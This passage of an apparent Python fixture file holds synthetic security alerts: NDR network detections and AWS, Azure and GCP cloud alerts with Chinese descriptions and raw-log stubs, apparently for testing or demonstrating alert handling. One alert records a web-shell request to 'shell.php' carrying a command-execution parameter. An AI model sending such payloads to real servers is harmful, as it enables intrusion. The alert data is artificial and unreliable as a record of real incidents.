            {"type": "protocol", "value": "HTTP (80)"},
            {"type": "threat_score", "value": 95}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T09:35:54.666Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.1.101",
            "dst_ip": "198.51.100.25",
            "dst_port": 80
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-08-New-Service-Running-on-Unusual-Port",
        "rule_name": "新服务在异常端口运行",
        "alert_date": "2025-09-24T09:40:40Z",
        "tags": ["service-anomaly", "backdoor", "persistence"],
        "severity": "High",
        "reference": "主机192.168.10.5上出现新监听服务",
        "description": "服务器 192.168.10.5 上突然出现了一个在非标准端口 8443 上监听的服务。这可能是一个后门或远程访问工具。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.10.5"},
            {"type": "listening_port", "value": 8443},
            {"type": "protocol", "value": "TCP"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-05",
            "timestamp": "2025-09-24T09:40:39.111Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.10.5",
            "dst_ip": "192.168.10.5",
            "dst_port": 8443,
            "action": "LISTEN"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-09-Large-Unencrypted-Internal-File-Transfer",
        "rule_name": "大容量未加密文件传输",
        "alert_date": "2025-09-24T09:45:15Z",
        "tags": ["data-in-motion", "policy-violation", "data-exfiltration"],
        "severity": "Low",
        "reference": "主机192.168.2.50进行大文件传输",
        "description": "主机 192.168.2.50 向另一台主机 192.168.3.88 发送了超过 1 GB 的未加密数据。这可能违反数据安全策略。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "destination_ip", "value": "192.168.3.88"},
            {"type": "protocol", "value": "FTP"},
            {"type": "data_volume_gb", "value": 1.2}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T09:45:14.543Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.2.50",
            "dst_ip": "192.168.3.88",
            "dst_port": 21,
            "protocol": "FTP",
            "upload_bytes": 1288490188
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-10-Web-Shell-Traffic-Signature",
        "rule_name": "WebShell流量特征",
        "alert_date": "2025-09-24T09:50:00Z",
        "tags": ["web-shell", "post-exploitation", "web-application"],
        "severity": "Critical",
        "reference": "Web服务器10.10.10.100上的WebShell通信",
        "description": "Web 服务器 10.10.10.100 与一个外部 IP 地址进行通信，流量中包含与已知 WebShell (China Chopper) 相关的特定 HTTP 参数和模式。",
        "artifacts": [
            {"type": "source_ip", "value": "10.10.10.100"},
            {"type": "destination_ip", "value": "172.67.100.200"},
            {"type": "protocol", "value": "HTTPS"},
            {"type": "attack_type", "value": "WebShell"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-06",
            "timestamp": "2025-09-24T09:49:59.000Z",
            "event_type": "HTTPFlow",
            "src_ip": "10.10.10.100",
            "dst_ip": "172.67.100.200",
            "http_host": "www.mycorp-web.com",
            "http_uri": "/images/shell.php",
            "http_body_params": "z0=system('whoami')"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-11-Malicious-SSL-Certificate",
        "rule_name": "使用恶意SSL证书的连接",
        "alert_date": "2025-09-24T09:55:30Z",
        "tags": ["ssl-tls", "malware", "c2"],
        "severity": "High",
        "reference": "主机192.168.1.101连接到使用恶意证书的服务器",
        "description": "主机 192.168.1.101 与一个使用自签名 SSL 证书且被威胁情报标记为恶意的服务器建立了 HTTPS 连接。这通常是 C2 或恶意软件通信的特征。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "203.0.113.1"},
            {"type": "certificate_fingerprint", "value": "abacadaeafabacadaeafabacadaeafabacadae"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T09:55:29.876Z",
            "event_type": "TLSFlow",
            "src_ip": "192.168.1.101",
            "dst_ip": "203.0.113.1",
            "dst_port": 443,
            "ssl_info": {"issuer": "Self-Signed", "fingerprint_sha1": "abacadaeafabacadaeafabacadaeafabacadae"}
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-12-Database-Connection-Anomaly",
        "rule_name": "数据库连接异常",
        "alert_date": "2025-09-24T10:00:15Z",
        "tags": ["database-access", "insider-threat", "data-exfiltration"],
        "severity": "Medium",
        "reference": "主机192.168.2.50连接到生产数据库",
        "description": "主机 192.168.2.50（一名非 DBA 的普通员工工作站）与生产数据库服务器建立了连接。该连接行为违反了其职责权限。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "destination_ip", "value": "192.168.10.50"},
            {"type": "protocol", "value": "SQL (1433)"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T10:00:14.666Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.2.50",
            "dst_ip": "192.168.10.50",
            "dst_port": 1433,
            "protocol": "SQLServer"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-13-Worm-like-Activity-Spike",
        "rule_name": "蠕虫类传播行为",
        "alert_date": "2025-09-24T10:05:40Z",
        "tags": ["worm", "propagation", "lateral-movement"],
        "severity": "Critical",
        "reference": "主机192.168.1.101对多个主机进行高频连接",
        "description": "主机 192.168.1.101 在极短时间内对内部网络中的大量随机主机进行高频连接尝试。此行为与蠕虫或病毒的传播模式一致。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "target_count", "value": "50+ unique IPs"},
            {"type": "rate", "value": "10 connections/sec"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T10:05:39.111Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.1.101",
            "dst_ips": ["192.168.1.5", "192.168.1.12", "192.168.1.34", "..."],
            "dst_port": 445
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-14-Encrypted-Traffic-Spike-to-New-Destination",
        "rule_name": "新目的地加密流量激增",
        "alert_date": "2025-09-24T10:10:05Z",
        "tags": ["encryption", "anomaly", "data-exfiltration"],
        "severity": "Medium",
        "reference": "主机192.168.4.12向新外部IP发起大流量HTTPS",
        "description": "主机 192.168.4.12 开始向一个之前未曾见过的外部 IP 地址 5.6.7.8 传输大量 HTTPS 加密数据。此行为可能表示数据外泄。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.4.12"},
            {"type": "destination_ip", "value": "5.6.7.8"},
            {"type": "protocol", "value": "HTTPS"},
            {"type": "data_volume_mb", "value": 250}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-04",
            "timestamp": "2025-09-24T10:10:04.543Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.4.12",
            "dst_ip": "5.6.7.8",
            "dst_port": 443,
            "upload_bytes": 262144000
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-15-Unauthorized-Cloud-Access-Traffic",
        "rule_name": "非授权云服务访问流量",
        "alert_date": "2025-09-24T10:15:30Z",
        "tags": ["cloud-access", "policy-violation", "data-exfiltration"],
        "severity": "Low",
        "reference": "主机192.168.2.50连接到个人云存储",
        "description": "主机 192.168.2.50 发起与未经公司授权的个人云存储服务（如 Dropbox、Google Drive）的连接。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "destination_domain", "value": "drive.google.com"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T10:15:29.876Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.2.50",
            "dst_ip": "142.250.191.110",
            "dst_port": 443,
            "app_protocol": "Google_Drive"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-16-DNS-Exfiltration-Slow-Rate",
        "rule_name": "慢速DNS数据外泄",
        "alert_date": "2025-09-24T10:20:00Z",
        "tags": ["dns", "exfiltration", "low-and-slow"],
        "severity": "Medium",
        "reference": "主机192.168.3.88发起慢速DNS查询",
        "description": "主机 192.168.3.88 发起少量但持续的、包含长且无意义子域名的 DNS 查询，这是一种试图规避检测的慢速数据外泄技术。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.3.88"},
            {"type": "query_domain", "value": "a1b2.malicious-domain.com"},
            {"type": "query_volume", "value": "5 queries/min"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-03",
            "timestamp": "2025-09-24T10:19:59.000Z",
            "event_type": "DNSQuery",
            "src_ip": "192.168.3.88",
            "query": "a1b2c3d4.malicious-domain.com",
            "query_type": "A"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-17-P2P-Communication-Detected",
        "rule_name": "P2P通信检测",
        "alert_date": "2025-09-24T10:25:45Z",
        "tags": ["p2p", "policy-violation"],
        "severity": "Low",
        "reference": "主机192.168.1.101进行P2P通信",
        "description": "主机 192.168.1.101 的流量模式显示其正在参与点对点（P2P）通信，这违反了公司网络使用策略，并可能导致恶意软件传播。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "protocol", "value": "BitTorrent"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T10:25:44.888Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.1.101",
            "dst_port": 6881,
            "app_protocol": "BitTorrent"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-18-Admin-Account-Unusual-Login",
        "rule_name": "管理员账户异常登录",
        "alert_date": "2025-09-24T10:30:10Z",
        "tags": ["privileged-account", "anomaly", "lateral-movement"],
        "severity": "High",
        "reference": "管理员账户Admin-01在非标准时间进行登录",
        "description": "特权管理员账户 'Admin-01' 在夜间（非其通常工作时间）从一台普通工作站（192.168.2.50）登录了域控制器。此行为与其常规操作模式不符。",
        "artifacts": [
            {"type": "username", "value": "Admin-01"},
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "target_ip", "value": "192.168.10.100"},
            {"type": "time_of_day", "value": "after-hours"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T10:30:09.543Z",
            "event_type": "KerberosFlow",
            "client_ip": "192.168.2.50",
            "server_ip": "192.168.10.100",
            "account_name": "Admin-01",
            "service": "Kerberos_Authentication_Success"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-19-DNS-DGA-Traffic",
        "rule_name": "DNS域名生成算法（DGA）流量",
        "alert_date": "2025-09-24T10:35:55Z",
        "tags": ["dga", "c2", "malware"],
        "severity": "Critical",
        "reference": "主机192.168.1.101向DGA域名发起查询",
        "description": "主机 192.168.1.101 正在向一个由域名生成算法（DGA）创建的域名发起 DNS 查询。DGA 是僵尸网络使用的常见技术，用于动态生成 C2 服务器域名。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "query_domain", "value": "e9a6f2b5d0c7.malwaredomain.net"},
            {"type": "threat_type", "value": "DGA C2"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T10:35:54.666Z",
            "event_type": "DNSQuery",
            "src_ip": "192.168.1.101",
            "query": "e9a6f2b5d0c7.malwaredomain.net"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-20-Internal-Reconnaissance-Nmap-Activity",
        "rule_name": "内部侦察（Nmap活动）",
        "alert_date": "2025-09-24T10:40:40Z",
        "tags": ["reconnaissance", "nmap", "lateral-movement"],
        "severity": "High",
        "reference": "主机192.168.2.50进行Nmap扫描",
        "description": "NDR 检测到主机 192.168.2.50 发起的流量模式与 Nmap 扫描工具的指纹相匹配。此行为表明内部网络正在被主动侦察。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "tool_name", "value": "Nmap"},
            {"type": "scan_pattern", "value": "SYN, FIN, XMAS flags"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T10:40:39.111Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.2.50",
            "dst_ips": "192.168.2.0/24",
            "tcp_flags": "SYN"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-21-ICMP-Tunneling",
        "rule_name": "ICMP 隧道通信",
        "alert_date": "2025-09-24T10:45:15Z",
        "tags": ["icmptunnel", "c2", "exfiltration"],
        "severity": "High",
        "reference": "主机192.168.3.88进行ICMP隧道通信",
        "description": "主机 192.168.3.88 发出大量包含异常数据负载的 ICMP 请求。这可能是利用 ICMP 隧道进行秘密通信（如 C2）的迹象。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.3.88"},
            {"type": "destination_ip", "value": "203.0.113.50"},
            {"type": "protocol", "value": "ICMP"},
            {"type": "payload_size", "value": "unusual"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-03",
            "timestamp": "2025-09-24T10:45:14.543Z",
            "event_type": "ICMPFlow",
            "src_ip": "192.168.3.88",
            "dst_ip": "203.0.113.50",
            "icmp_type": "echo-request",
            "icmp_payload_length": 1024
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-22-IoT-Device-Unusual-Traffic",
        "rule_name": "IoT设备异常流量",
        "alert_date": "2025-09-24T10:50:00Z",
        "tags": ["iot", "anomaly", "botnet"],
        "severity": "High",
        "reference": "智能打印机发起外部连接",
        "description": "一台通常只进行内部通信的智能打印机 (192.168.5.10) 突然开始向外部 IP 地址 198.51.100.100 发起大量网络连接。这表明该设备可能已被劫持并成为僵尸网络的一部分。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.5.10"},
            {"type": "destination_ip", "value": "198.51.100.100"},
            {"type": "device_type", "value": "Printer"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-05",
            "timestamp": "2025-09-24T10:49:59.000Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.5.10",
            "dst_ip": "198.51.100.100",
            "dst_port": 80
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-23-Lateral-Movement-Failed-Logins",
        "rule_name": "横向移动失败登录尝试",
        "alert_date": "2025-09-24T10:55:30Z",
        "tags": ["lateral-movement", "authentication", "brute-force"],
        "severity": "Medium",
        "reference": "主机192.168.2.50对多台服务器发起失败的SSH登录",
        "description": "主机 192.168.2.50 在短时间内对多台 Linux 服务器进行了大量的失败 SSH 登录尝试。这是一种常见的横向移动技术。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "protocol", "value": "SSH (22)"},
            {"type": "failed_logins", "value": 20},
            {"type": "target_count", "value": 5}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T10:55:29.876Z",
            "event_type": "AuthenticationFailure",
            "client_ip": "192.168.2.50",
            "server_ip": "192.168.2.10, 192.168.2.11,...",
            "service": "SSH"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-24-VPN-Traffic-to-Unusual-Endpoint",
        "rule_name": "VPN流量异常端点",
        "alert_date": "2025-09-24T11:00:15Z",
        "tags": ["vpn", "policy-violation", "circumvention"],
        "severity": "Low",
        "reference": "主机192.168.1.101连接到私人VPN服务",
        "description": "主机 192.168.1.101 正在与一个已知私人 VPN 服务提供商的 IP 地址进行通信。这可能用于规避公司网络安全控制。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "104.16.200.100"},
            {"type": "destination_provider", "value": "NordVPN"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T11:00:14.666Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.1.101",
            "dst_ip": "104.16.200.100",
            "dst_port": 1194,
            "app_protocol": "OpenVPN"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-25-Outbound-SMB-to-External-IP",
        "rule_name": "出站SMB连接到外部IP",
        "alert_date": "2025-09-24T11:05:00Z",
        "tags": ["lateral-movement", "outbound", "data-exfiltration"],
        "severity": "High",
        "reference": "主机192.168.2.50尝试SMB连接到外部IP",
        "description": "主机 192.168.2.50 尝试向一个外部 IP 地址 203.0.113.100 发起 SMB (Server Message Block) 连接。正常情况下，SMB 连接不应出站到互联网，这可能是数据外泄或恶意软件的迹象。",
        "artifacts": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "destination_ip", "value": "203.0.113.100"},
            {"type": "protocol", "value": "SMB (445)"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T11:04:59.000Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.2.50",
            "dst_ip": "203.0.113.100",
            "dst_port": 445
        }
    }
]
cloud_alert = [
    {
        "source": "CLOUD",
        "cloud_provider": "AWS",
        "service": "IAM",
        "rule_id": "CLOUD-AWS-IAM-01-Root-User-Activity",
        "rule_name": "Root账户活动",
        "alert_date": "2025-09-23T23:05:00Z",
        "tags": ["iam", "privileged-account", "security-best-practice"],
        "severity": "High",
        "reference": "AWS Root账户进行登录",
        "description": "AWS Root账户在非指定设备上进行了登录。出于安全最佳实践，Root账户应被锁定且只在紧急情况下使用。",
        "artifacts": [
            {"type": "account_id", "value": "123456789012"},
            {"type": "user_identity", "value": "Root"},
            {"type": "event_name", "value": "ConsoleLogin"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-23T23:04:59.888Z",
            "event_name": "ConsoleLogin",
            "userIdentity": {"type": "Root"},
            "sourceIPAddress": "203.0.113.10",
            "user_agent": "Mozilla/5.0"
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "Azure",
        "service": "Compute",
        "rule_id": "CLOUD-AZ-COMPUTE-02-VM-Reconnaissance",
        "rule_name": "虚拟机内部侦察",
        "alert_date": "2025-09-23T23:10:30Z",
        "tags": ["compute", "reconnaissance", "lateral-movement"],
        "severity": "Medium",
        "reference": "Azure VM进行内部网络扫描",
        "description": "Azure 虚拟机 'prod-web-01' 突然开始对内部虚拟网络中的其他资源进行大规模端口扫描。这可能表明该虚拟机已被入侵。",
        "artifacts": [
            {"type": "vm_name", "value": "prod-web-01"},
            {"type": "vm_ip", "value": "10.0.0.4"},
            {"type": "scan_type", "value": "TCP Port Scan"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Network Watcher",
            "timestamp": "2025-09-23T23:10:29.987Z",
            "event_type": "NetworkSecurityGroupFlowEvent",
            "properties": {"src_ip": "10.0.0.4", "dest_ip": "10.0.0.0/24", "dest_port_range": "*", "protocol": "TCP"}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "GCP",
        "service": "Storage",
        "rule_id": "CLOUD-GCP-STORAGE-03-Public-Bucket-Access",
        "rule_name": "公开访问的存储桶",
        "alert_date": "2025-09-23T23:15:20Z",
        "tags": ["storage", "misconfiguration", "data-leak"],
        "severity": "High",
        "reference": "GCP存储桶被设置为公开可访问",
        "description": "名为 'mycorp-customer-data' 的 GCP Cloud Storage 存储桶的权限被修改为公开可访问。这可能导致敏感数据泄露。",
        "artifacts": [
            {"type": "bucket_name", "value": "mycorp-customer-data"},
            {"type": "permission_change", "value": "publicAccess: True"},
            {"type": "user_identity", "value": "api-service-account"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud Audit Logs",
            "timestamp": "2025-09-23T23:15:19.444Z",
            "methodName": "storage.buckets.setIamPolicy",
            "principalEmail": "api-service-account@mycorp.iam.gserviceaccount.com",
            "resource": {"type": "storage_bucket", "name": "mycorp-customer-data"}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "AWS",
        "service": "EC2",
        "rule_id": "CLOUD-AWS-EC2-04-Instance-Stop-Anomaly",
        "rule_name": "EC2实例异常停止",
        "alert_date": "2025-09-23T23:20:55Z",
        "tags": ["compute", "availability", "compromised-account"],
        "severity": "Medium",
        "reference": "EC2实例'web-server-02'被异常停止",
        "description": "EC2 实例 'web-server-02' 在非工作时间被一个不寻常的 IAM 角色停止。此行为可能表示账户被盗用。",
        "artifacts": [
            {"type": "instance_id", "value": "i-0a1b2c3d4e5f6a7b8"},
            {"type": "instance_name", "value": "web-server-02"},
            {"type": "event_name", "value": "StopInstances"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-23T23:20:54.666Z",
            "event_name": "StopInstances",
            "userIdentity": {"type": "AssumedRole", "principalId": "AROAIEXAMPLEID:developer-role"},
            "requestParameters": {"instancesSet": {"items": [{"instanceId": "i-0a1b2c3d4e5f6a7b8"}]}}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "Azure",
        "service": "IAM",
        "rule_id": "CLOUD-AZ-IAM-05-High-Risk-User-Login",
        "rule_name": "高风险用户的登录",
        "alert_date": "2025-09-23T23:25:40Z",
        "tags": ["iam", "risky-user", "compromised-account"],
        "severity": "High",
        "reference": "Azure AD用户'j.doe'被标记为高风险",
        "description": "Azure AD 识别出用户 'j.doe' 的登录行为为高风险，例如来自匿名 IP 地址或不可能的行程。这可能表明账户已被盗用。",
        "artifacts": [
            {"type": "user_id", "value": "j.doe@mycorp.com"},
            {"type": "risk_state", "value": "High"},
            {"type": "risk_detection", "value": "Anonymous IP address"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure AD Identity Protection",
            "timestamp": "2025-09-23T23:25:39.999Z",
            "eventName": "RiskDetected",
            "properties": {"userPrincipalName": "j.doe@mycorp.com", "riskLevel": "High", "riskDetectionType": "Anonymous IP address"}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "GCP",
        "service": "Network",
        "rule_id": "CLOUD-GCP-NET-06-Firewall-Rule-Modified",
        "rule_name": "防火墙规则异常修改",
        "alert_date": "2025-09-23T23:30:10Z",
        "tags": ["networking", "misconfiguration", "access-control"],
        "severity": "High",
        "reference": "GCP防火墙规则被修改为允许所有流量",
        "description": "GCP 防火墙规则 'allow-all-inbound' 被修改，允许来自所有 IP 地址的入站流量。此操作可能为攻击者创建了入侵点。",
        "artifacts": [
            {"type": "rule_name", "value": "allow-all-inbound"},
            {"type": "source_ip", "value": "0.0.0.0/0"},
            {"type": "user_identity", "value": "user@mycorp.com"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud Audit Logs",
            "timestamp": "2025-09-23T23:30:09.543Z",
            "methodName": "compute.firewalls.update",
            "principalEmail": "user@mycorp.com",
            "requestJson": {"sourceRanges": ["0.0.0.0/0"]}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "AWS",
        "service": "S3",
        "rule_id": "CLOUD-AWS-S3-07-Sensitive-File-Uploaded",
        "rule_name": "敏感文件上传至公开桶",
        "alert_date": "2025-09-23T23:35:00Z",
        "tags": ["storage", "data-leak", "compliance"],
        "severity": "High",
        "reference": "包含敏感信息的CSV文件上传至S3",
        "description": "名为 'customer-pii.csv' 的文件被上传到一个公共可访问的 S3 存储桶。该文件可能包含个人身份信息（PII）。",
        "artifacts": [
            {"type": "bucket_name", "value": "mycorp-public-data"},
            {"type": "file_name", "value": "customer-pii.csv"},
            {"type": "user_identity", "value": "s.brown"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-23T23:34:59.000Z",
            "event_name": "PutObject",
            "userIdentity": {"arn": "arn:aws:iam::123456789012:user/s.brown"},
            "requestParameters": {"bucketName": "mycorp-public-data", "key": "customer-pii.csv"}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "Azure",
        "service": "Networking",
        "rule_id": "CLOUD-AZ-NET-08-New-VPN-Gateway-Created",
        "rule_name": "新VPN网关创建",
        "alert_date": "2025-09-23T23:40:15Z",
        "tags": ["networking", "policy-violation", "lateral-movement"],
        "severity": "Medium",
        "reference": "Azure中创建了新的VPN网关",
        "description": "一个未知的账户 'developer-account' 创建了一个新的 Azure VPN 网关，并将其连接到内部虚拟网络。这可能是一个非授权的访问点。",
        "artifacts": [
            {"type": "gateway_name", "value": "malicious-vpn-gw"},
            {"type": "user_identity", "value": "developer-account"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure Activity Log",
            "timestamp": "2025-09-23T23:40:14.999Z",
            "event_name": "Create or Update VPN Gateway",
            "caller": "developer-account@mycorp.com",
            "properties": {"resource": "malicious-vpn-gw"}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "GCP",
        "service": "IAM",
        "rule_id": "CLOUD-GCP-IAM-09-Service-Account-API-Spike",
        "rule_name": "服务账户API调用激增",
        "alert_date": "2025-09-23T23:45:30Z",
        "tags": ["iam", "api-call", "anomaly", "compromised-account"],
        "severity": "High",
        "reference": "服务账户'prod-service'API调用激增",
        "description": "服务账户 'prod-service' 突然发起了异常大量的 API 调用，包括创建虚拟机的请求。这可能表明该账户已被盗用。",
        "artifacts": [
            {"type": "service_account", "value": "prod-service-account@mycorp.iam.gserviceaccount.com"},
            {"type": "api_calls", "value": "1000+/min"},
            {"type": "unusual_activity", "value": "compute.instances.insert"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud Audit Logs",
            "timestamp": "2025-09-23T23:45:29.876Z",
            "methodName": "compute.instances.insert",
            "principalEmail": "prod-service-account@mycorp.iam.gserviceaccount.com"
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "AWS",
        "service": "Database",
        "rule_id": "CLOUD-AWS-DB-10-Unusual-RDS-Access",
        "rule_name": "RDS数据库异常访问",
        "alert_date": "2025-09-23T23:50:00Z",
        "tags": ["database", "data-exfiltration", "access-anomaly"],
        "severity": "High",
        "reference": "RDS实例从异常IP访问",
        "description": "AWS RDS 实例 'prod-db-01' 被来自一个之前从未见过的外部 IP 地址访问。这可能是数据外泄或入侵的迹象。",
        "artifacts": [
            {"type": "db_instance_id", "value": "database-1"},
            {"type": "source_ip", "value": "104.22.56.78"},
            {"type": "database_type", "value": "MySQL"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-23T23:49:59.000Z",
            "event_name": "Connect",
            "requestParameters": {"dbInstanceIdentifier": "database-1"},
            "sourceIPAddress": "104.22.56.78"
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "Azure",
        "service": "Storage",
        "rule_id": "CLOUD-AZ-STORAGE-11-Blob-Deletion",
        "rule_name": "Blob存储桶大规模删除",
        "alert_date": "2025-09-23T23:55:10Z",
        "tags": ["storage", "data-destruction", "ransomware"],
        "severity": "Critical",
        "reference": "Azure Blob存储桶被大规模删除文件",
        "description": "存储账户 'mycorp-data-storage' 中的 Blob 存储桶 'backups' 在短时间内发生了大规模文件删除。这可能表明数据销毁或勒索软件攻击。",
        "artifacts": [
            {"type": "account_name", "value": "mycorp-data-storage"},
            {"type": "container_name", "value": "backups"},
            {"type": "user_identity", "value": "compromised-account"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure Activity Log",
            "timestamp": "2025-09-23T23:55:09.123Z",
            "eventName": "Microsoft.Storage/storageAccounts/blobServices/containers/delete",
            "caller": "compromised-account@mycorp.com"
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "GCP",
        "service": "IAM",
        "rule_id": "CLOUD-GCP-IAM-12-High-Risk-Role-Assigned",
        "rule_name": "高风险角色分配",
        "alert_date": "2025-09-24T00:00:20Z",
        "tags": ["iam", "privilege-escalation", "misconfiguration"],
        "severity": "High",
        "reference": "GCP用户被授予'Owner'角色",
        "description": "用户 'l.smith' 被授予了 GCP 项目的 'Owner' 角色。此角色具有最高权限，且通常只授予少数几个核心管理员。",
        "artifacts": [
            {"type": "user_identity", "value": "l.smith"},
            {"type": "role_granted", "value": "roles/owner"},
            {"type": "project_id", "value": "mycorp-prod-project"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud Audit Logs",
            "timestamp": "2025-09-24T00:00:19.999Z",
            "methodName": "SetIamPolicy",
            "principalEmail": "l.smith@mycorp.com",
            "requestJson": {"bindings": [{"role": "roles/owner"}]}
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "AWS",
        "service": "Lambda",
        "rule_id": "CLOUD-AWS-LAMBDA-13-Lambda-Inbound-Connection",
        "rule_name": "Lambda函数异常入站连接",
        "alert_date": "2025-09-24T00:05:00Z",
        "tags": ["serverless", "reconnaissance", "lateral-movement"],
        "severity": "High",
        "reference": "Lambda函数被异常IP访问",
        "description": "Lambda 函数 'customer-processor-func' 从一个异常的、不属于其触发器的 IP 地址发起调用。这可能表明存在漏洞利用。",
        "artifacts": [
            {"type": "lambda_name", "value": "customer-processor-func"},
            {"type": "source_ip", "value": "1.1.1.1"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudWatch Logs",
            "timestamp": "2025-09-24T00:04:59.876Z",
            "log_stream": "/aws/lambda/customer-processor-func",
            "log_message": "Request from 1.1.1.1 to Lambda function"
        }
    },
    {
        "source": "CLOUD",
        "cloud_provider": "Azure",
        "service": "Database",
        "rule_id": "CLOUD-AZ-DB-14-Large-Query-DB-Anomaly",
        "rule_name": "数据库异常大批量查询",
        "alert_date": "2025-09-24T00:10:30Z",
        "tags": ["database", "data-exfiltration", "anomaly"],
        "severity": "High",
        "reference": "Azure SQL数据库异常批量查询",
        "description": "Azure SQL 数据库 'prod-sql-db' 在非工作时间收到了异常大批量的查询请求。这可能表明数据外泄或恶意侦察。",
        "artifacts": [
            {"type": "db_name", "value": "prod-sql-db"},
            {"type": "query_count", "value": "10000+ queries/min"},
            {"type": "user_identity", "value": "app-service-user"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure SQL Audit Log",
            "timestamp": "2025-09-24T00:10:29.999Z",
            "statement": "SELECT * FROM [CustomerTable]",
